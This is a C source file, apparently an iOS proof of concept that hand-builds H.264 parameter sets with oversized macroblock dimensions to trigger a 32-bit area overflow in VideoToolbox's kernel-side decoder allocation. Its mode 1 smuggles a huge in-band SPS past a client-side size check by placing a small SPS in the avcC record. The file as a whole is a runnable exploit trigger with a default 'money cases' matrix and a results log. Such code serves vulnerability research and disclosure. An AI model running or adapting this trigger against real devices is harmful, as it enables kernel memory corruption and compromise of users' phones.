/*
 * vtdec_pure.c - O-D (fourth sibling). Pure-C port of vtdec_poc.c:
 * identical VT/CM machinery (unchanged), report shell rebuilt with ZERO ObjC
 * (the CGDEC 4/4 PAC-DA startup trap is the ObjC dispatch path under DVT
 * launch - CGDECPURE proved pure C survives). Report: Documents/vtdec_report.txt.
 * Env knobs unchanged: VTD_W, VTD_H, VTD_MODE, VTD_FRAME, VTD_LIST.
 *
 * Build: $CC -O0 -g -o VTDECPURE vtdec_pure.c
 *        -framework VideoToolbox -framework CoreMedia -framework CoreVideo -framework CoreFoundation
 */

#include <CoreFoundation/CoreFoundation.h>
#include <CoreMedia/CoreMedia.h>
#include <CoreVideo/CoreVideo.h>
#include <VideoToolbox/VideoToolbox.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/stat.h>
#include <time.h>

/* ------------------------------------------------------------------ report (pure C) */
static FILE *g_report = NULL;

static void report_open(void)
{
    const char *home = getenv("CFFIXED_USER_HOME");
    if (!home || !*home) home = getenv("HOME");
    if (!home || !*home) home = "/var/mobile";
    char dir[1024];
    snprintf(dir, sizeof(dir), "%s/Documents", home);
    mkdir(dir, 0755);
    char path[1280];
    snprintf(path, sizeof(path), "%s/vtdec_report.txt", dir);
    g_report = fopen(path, "a");
    if (g_report) {
        time_t t = time(NULL);
        fprintf(g_report, "=== vtdec_pure run %s", ctime(&t));
        fflush(g_report);
    }
}

static void rline(const char *s)
{
    if (!g_report) return;
    fprintf(g_report, "%s\n", s);
    fflush(g_report);
}

static void rlinef(const char *fmt, ...)
{
    va_list ap;
    char buf[1024];
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    rline(buf);
}

static int envi_default(const char *k, int dflt)
{
	const char *v = getenv(k);
	return (v && *v) ? atoi(v) : dflt;
}

/* ------------------------------------------------------------- bit writer */
typedef struct {
	unsigned char buf[4096];
	int bitpos;
} bw_t;

static void bw_init(bw_t *b) { memset(b->buf, 0, sizeof(b->buf)); b->bitpos = 0; }

static void bw_bit(bw_t *b, int v)
{
	if (v) b->buf[b->bitpos >> 3] |= (unsigned char)(0x80 >> (b->bitpos & 7));
	b->bitpos++;
}

static void bw_bits(bw_t *b, int n, unsigned v)
{
	for (int i = n - 1; i >= 0; i--) bw_bit(b, (v >> i) & 1);
}

/* unsigned Exp-Golomb */
static void bw_ue(bw_t *b, unsigned v)
{
	unsigned code = v + 1;
	int nbits = 0;
	unsigned t = code;
	while (t > 1) { t >>= 1; nbits++; }
	for (int i = 0; i < nbits; i++) bw_bit(b, 0);
	bw_bits(b, nbits + 1, code);
}

/* signed Exp-Golomb: se(v) = ue(2v) for v>=0, ue(-2v-1) for v<0.
   se(0) is a single '1' bit - writing raw zero bits here is what made
   Apple reject every parameter set with -12712. */
static void bw_se(bw_t *b, int v)
{
	unsigned mapped = (v >= 0) ? (unsigned)(2 * v) : (unsigned)(-2 * v - 1);
	bw_ue(b, mapped);
}

static void bw_trailing(bw_t *b)
{
	bw_bit(b, 1);
	while (b->bitpos & 7) bw_bit(b, 0);
}

static int bw_len(bw_t *b) { return (b->bitpos + 7) / 8; }

/* ------------------------------------------------------------------ stream */
/* NAL: forbidden_zero(1) nal_ref_idc(2) nal_unit_type(5) */
static int nal_header(int type, int ref_idc) { return ((ref_idc & 3) << 5) | (type & 0x1F); }

static void build_sps(bw_t *b, int mb_w, int mb_h, int level)
{
	bw_init(b);
	bw_bits(b, 8, nal_header(7, 3));   /* SPS: type 7, ref_idc 3 -> 0x67 (25 was a typo: type 25 is reserved and Apple rejects the set) */
	bw_bits(b, 8, 66);            /* profile_idc = baseline (no chroma_format_idc) */
	bw_bits(b, 8, 0);             /* constraint flags + reserved */
	bw_bits(b, 8, level);         /* level_idc */
	bw_ue(b, 0);                  /* seq_parameter_set_id */
	bw_ue(b, 0);                  /* log2_max_frame_num_minus4 */
	bw_ue(b, 2);                  /* pic_order_cnt_type = 2 (display order == decode order) */
	bw_ue(b, 1);                  /* max_num_ref_frames */
	bw_bit(b, 0);                 /* gaps_in_frame_num_value_allowed_flag */
	bw_ue(b, (unsigned)(mb_w - 1));   /* pic_width_in_mbs_minus1 */
	bw_ue(b, (unsigned)(mb_h - 1));   /* pic_height_in_map_units_minus1 */
	bw_bit(b, 1);                 /* frame_mbs_only_flag */
	bw_bit(b, 1);                 /* direct_8x8_inference_flag */
	bw_bit(b, 0);                 /* frame_cropping_flag */
	bw_bit(b, 0);                 /* vui_parameters_present_flag */
	bw_trailing(b);
}

static void build_pps(bw_t *b)
{
	bw_init(b);
	bw_bits(b, 8, nal_header(8, 3));
	bw_ue(b, 0);                  /* pic_parameter_set_id */
	bw_ue(b, 0);                  /* seq_parameter_set_id */
	bw_bit(b, 0);                 /* entropy_coding_mode_flag */
	bw_bit(b, 0);                 /* bottom_field_pic_order_in_frame_present */
	bw_ue(b, 0);                  /* num_slice_groups_minus1 */
	bw_ue(b, 0);                  /* num_ref_idx_l0_default_active_minus1 */
	bw_ue(b, 0);                  /* num_ref_idx_l1_default_active_minus1 */
	bw_bit(b, 0);                 /* weighted_pred_flag */
	bw_bits(b, 2, 0);             /* weighted_bipred_idc */
	bw_se(b, 0);                  /* pic_init_qp_minus26 (se(0) = single '1' bit) */
	bw_se(b, 0);                  /* pic_init_qs_minus26 */
	bw_se(b, 0);                  /* chroma_qp_index_offset */
	bw_bit(b, 1);                 /* deblocking_filter_control_present_flag */
	bw_bit(b, 0);                 /* constrained_intra_pred_flag */
	bw_bit(b, 0);                 /* redundant_pic_cnt_present_flag */
	bw_trailing(b);
}

/* A minimal IDR slice: header only, then a (deliberately minimal) slice body. */
static void build_idr(bw_t *b)
{
	bw_init(b);
	bw_bits(b, 8, nal_header(5, 3));
	bw_ue(b, 0);      /* first_mb_in_slice */
	bw_ue(b, 7);      /* slice_type = I (all slices) */
	bw_ue(b, 0);      /* pic_parameter_set_id */
	bw_bits(b, 4, 0); /* frame_num (log2_max_frame_num = 4) */
	bw_ue(b, 0);      /* idr_pic_id */
	/* pic_order_cnt_type == 2 -> nothing */
	/* slice_qp_delta */
	bw_ue(b, 0);
	/* deblocking_filter_control_present_flag == 1 -> disable_filter_idc + offsets */
	bw_ue(b, 1);
	bw_ue(b, 0);
	bw_ue(b, 0);
	/* slice data: one macroblock, minimal (mb_type I_16x16 needs 1 ue) */
	bw_ue(b, 25);    /* mb_type 25 = I_16x16 in an I slice */
	bw_bit(b, 0);    /* no intra pred mode (not needed for I_16x16) */
	/* remainder of the macroblock layer is not needed: the allocation is the
	   point, and the decode will fail (or crash) either way */
	bw_trailing(b);
}

/* ------------------------------------------------------------------ decode */
static volatile int g_frame_count = 0;

/* VTDecompressionOutputCallback - iOS 7-param signature */
static void dec_cb(void *decompressionOutputRefCon, void *sourceFrameRefCon, OSStatus status,
                   VTDecodeInfoFlags infoFlags, CVImageBufferRef imageBuffer,
                   CMTime presentationTimeStamp, CMTime presentationDuration)
{
	(void)decompressionOutputRefCon; (void)sourceFrameRefCon; (void)infoFlags; (void)imageBuffer;
	(void)presentationTimeStamp; (void)presentationDuration;
	g_frame_count++;
	rlinef("decode callback: status=%d", (int)status);
}

/* avcC record: the decoder configuration record that CMVideoFormatDescriptionCreate
   wants for H.264 (SPS + PPS inside). */
static int build_avcC(bw_t *sps, bw_t *pps, unsigned char *out, size_t outsz)
{
	size_t sl = bw_len(sps), pl = bw_len(pps);
	size_t need = 7 + sl + pl;
	if (need > outsz) return -1;
	size_t o = 0;
	out[o++] = 1;                      /* configurationVersion */
	out[o++] = sps->buf[1];             /* AVCProfileIndication */
	out[o++] = sps->buf[2];             /* profile_compatibility */
	out[o++] = sps->buf[3];             /* AVCLevelIndication */
	out[o++] = 0xFF;                   /* 6 bits reserved | lengthSizeMinusOne = 3 */
	out[o++] = 0xE1;                   /* 3 bits reserved | numOfSequenceParameterSets = 1 */
	out[o++] = (unsigned char)((sl >> 8) & 0xFF);
	out[o++] = (unsigned char)(sl & 0xFF);
	memcpy(out + o, sps->buf, sl); o += sl;
	out[o++] = 1;                      /* numOfPictureParameterSets */
	out[o++] = (unsigned char)((pl >> 8) & 0xFF);
	out[o++] = (unsigned char)(pl & 0xFF);
	memcpy(out + o, pps->buf, pl); o += pl;
	return (int)o;
}

static int run_one(int mb_w, int mb_h, int mode)
{
	bw_t sps, pps, idr;
	build_sps(&sps, mb_w, mb_h, 51);
	build_pps(&pps);
	build_idr(&idr);

	/* mode 0: the huge SPS rides in the avcC - tests the CLIENT-side gate.
	   mode 1: a small SPS (32x32 mbs = 512x512) rides in the avcC so the client
	           gate passes, and the huge SPS is delivered IN-BAND ahead of the
	           IDR - the kext parses it and allocates from the huge dims. */
	bw_t *avc_sps = &sps;
	bw_t sps_small;
	if (mode == 1) {
		build_sps(&sps_small, 32, 32, 51);
		avc_sps = &sps_small;
		rline("  mode 1: small SPS in avcC, huge SPS in-band");
	}

	long long px_w = (long long)mb_w * 16;
	long long px_h = (long long)mb_h * 16;
	unsigned area32 = (unsigned)((unsigned long long)(px_w * px_h) & 0xFFFFFFFFull);
	int area_signed = (int)area32;
	rlinef("== mbs %dx%d -> %lldx%lld px, exact product %lld, 32-bit %u (signed %d) ==",
	       mb_w, mb_h, px_w, px_h, px_w * px_h, area32, area_signed);

	unsigned char avcc[1024];
	int avccl = build_avcC(avc_sps, &pps, avcc, sizeof(avcc));
	if (avccl < 0) {
		rline("  avcC too big");
		return 1;
	}
	rlinef("  avcC record = %d bytes", avccl);

	/* format description straight from the parameter sets - the SPS carries the
	   real dimensions; the wrapper's w/h are only a hint. */
	const uint8_t *ps[2] = { avc_sps->buf, pps.buf };
	size_t psz[2] = { (size_t)bw_len(avc_sps), (size_t)bw_len(&pps) };
	/* hex-dump the exact bytes we hand to Apple - the -12712 needs ground truth */
	{
		rlinef("  PS[0] len=%zu bytes:", psz[0]);
		size_t dn = psz[0] < 24 ? psz[0] : 24;
		char hx[128]; size_t ho = 0;
		for (size_t i = 0; i < dn && ho < sizeof(hx) - 3; i++)
			ho += (size_t)snprintf(hx + ho, sizeof(hx) - ho, "%02x", avc_sps->buf[i]);
		hx[ho] = 0;
		rlinef("    %s", hx);
		rlinef("  PS[1] len=%zu bytes:", psz[1]);
		dn = psz[1] < 24 ? psz[1] : 24;
		ho = 0;
		for (size_t i = 0; i < dn && ho < sizeof(hx) - 3; i++)
			ho += (size_t)snprintf(hx + ho, sizeof(hx) - ho, "%02x", pps.buf[i]);
		hx[ho] = 0;
		rlinef("    %s", hx);
	}
	CMVideoFormatDescriptionRef fmt = NULL;
	OSStatus st = CMVideoFormatDescriptionCreateFromH264ParameterSets(
	    kCFAllocatorDefault, 2, ps, psz, 4, &fmt);
	rlinef("  CMVideoFormatDescriptionCreateFromH264ParameterSets st=%d", (int)st);
	if (st != noErr || !fmt) return 1;
	{
		CMVideoDimensions dim = CMVideoFormatDescriptionGetDimensions(fmt);
		rlinef("  format description says %d x %d", dim.width, dim.height);
	}

	VTDecompressionSessionRef sess = NULL;
	VTDecompressionOutputCallbackRecord rec;
	rec.decompressionOutputCallback = dec_cb;
	rec.decompressionOutputRefCon = NULL;
	OSStatus dst = VTDecompressionSessionCreate(kCFAllocatorDefault, fmt, NULL, NULL,
	                                            &rec, &sess);
	rlinef("  VTDecompressionSessionCreate st=%d (client-side gate)", (int)dst);
	if (dst != noErr || !sess) {
		CFRelease(fmt);
		return 2;
	}

	/* sample: 4-byte length prefix + NALs (avcC / length-prefixed mode).
	   mode 1 prepends the huge in-band SPS so the kext re-reads the dims. */
	size_t total;
	unsigned char *raw = NULL;
	if (mode == 1) {
		total = 4 + bw_len(&sps) + 4 + bw_len(&idr);
		raw = (unsigned char *)malloc(total);
		if (raw) {
			size_t o = 0;
			raw[o++] = 0; raw[o++] = 0;
			raw[o++] = (unsigned char)((bw_len(&sps) >> 8) & 0xFF);
			raw[o++] = (unsigned char)(bw_len(&sps) & 0xFF);
			memcpy(raw + o, sps.buf, bw_len(&sps)); o += bw_len(&sps);
			raw[o++] = 0; raw[o++] = 0;
			raw[o++] = (unsigned char)((bw_len(&idr) >> 8) & 0xFF);
			raw[o++] = (unsigned char)(bw_len(&idr) & 0xFF);
			memcpy(raw + o, idr.buf, bw_len(&idr));
		}
	} else {
		total = 4 + bw_len(&idr);
		raw = (unsigned char *)malloc(total);
		if (raw) {
			raw[0] = 0; raw[1] = 0;
			raw[2] = (unsigned char)((bw_len(&idr) >> 8) & 0xFF);
			raw[3] = (unsigned char)(bw_len(&idr) & 0xFF);
			memcpy(raw + 4, idr.buf, bw_len(&idr));
		}
	}

	CMBlockBufferRef bb = NULL;
	CMSampleBufferRef sample = NULL;
	if (raw) {
		OSStatus bs = CMBlockBufferCreateWithMemoryBlock(
		    kCFAllocatorDefault, raw, total, kCFAllocatorDefault, NULL, 0, total, 0, &bb);
		rlinef("  CMBlockBufferCreateWithMemoryBlock st=%d size=%zu", (int)bs, total);
		if (bs == noErr && bb) {
			CMSampleTimingInfo timing;
			timing.duration = CMTimeMake(1, 600);
			timing.presentationTimeStamp = CMTimeMake(0, 600);
			timing.decodeTimeStamp = kCMTimeInvalid;
			CMItemCount ssize = (CMItemCount)total;
			size_t ssize_sz = total;
			OSStatus ss = CMSampleBufferCreateReady(kCFAllocatorDefault, bb, fmt,
			                                        1, 1, &timing, 1, &ssize_sz, &sample);
			rlinef("  CMSampleBufferCreateReady st=%d size=%zu", (int)ss, total);
		}
	}
	if (sample) {
		rline("  submitting the frame (this is where the kext allocates)");
		/* iOS signature: (session, sampleBuffer, decodeFlags, sourceFrameRefCon,
		   VTDecodeInfoFlags *infoFlagsOut) - output arrives via the callback
		   record registered at session-create time (dec_cb). */
		VTDecodeInfoFlags iflags = 0;
		OSStatus ds = VTDecompressionSessionDecodeFrame(sess, sample, 0, NULL, &iflags);
		rlinef("  VTDecompressionSessionDecodeFrame st=%d (kext verdict)", (int)ds);
		VTDecompressionSessionFinishDelayedFrames(sess);
		CFRelease(sample);
	} else {
		rline("  no sample - session only");
	}
	if (bb) CFRelease(bb);
	/* raw is OWNED by the block buffer (kCFAllocatorDefault is the block
	   deallocator) - freeing it here too was the double-free that aborted
	   the process right after the kext interaction. DO NOT free raw. */
	VTDecompressionSessionInvalidate(sess);
	CFRelease(sess);
	CFRelease(fmt);
	return 0;
}

int main(void)
{
		report_open();
		const char *list = getenv("VTD_LIST");
		int mb_w = envi_default("VTD_W", 4096);
		int mb_h = envi_default("VTD_H", 4096);
		int mode = envi_default("VTD_MODE", 0);

		if (list && *list) {
			char buf[512];
			snprintf(buf, sizeof(buf), "%s", list);
			for (char *tok = strtok(buf, ","); tok; tok = strtok(NULL, ",")) {
				int a = 0, b = 0;
				if (sscanf(tok, "%d:%d", &a, &b) == 2) {
					rlinef("--- sweep %s ---", tok);
					run_one(a, b, mode);
				}
			}
	} else if (getenv("VTD_W")) {
		/* explicit single-shot: VTD_W/VTD_H x both modes, nothing else */
		for (int m = 0; m < 2; m++) {
			rlinef("--- single VTD_W/H mode=%d %dx%d mbs ---", m, mb_w, mb_h);
			run_one(mb_w, mb_h, m);
		}
	} else {
			/* default matrix: both money cases x both modes, 4095 as the
			   negative-check control (its area is signed-negative so the
			   kext's tbnz should reject it - a clean error there is GOOD). */
			static const int cases[3][2] = { { 4096, 4096 }, { 4097, 4097 }, { 4095, 4095 } };
			for (int m = 0; m < 2; m++)
				for (int i = 0; i < 3; i++) {
					rlinef("--- matrix mode=%d %dx%d mbs ---", m, cases[i][0], cases[i][1]);
					run_one(cases[i][0], cases[i][1], m);
				}
		}
		rline("vtdec DONE");
		if (g_report) { fflush(g_report); fclose(g_report); g_report = NULL; }
	return 0;
}
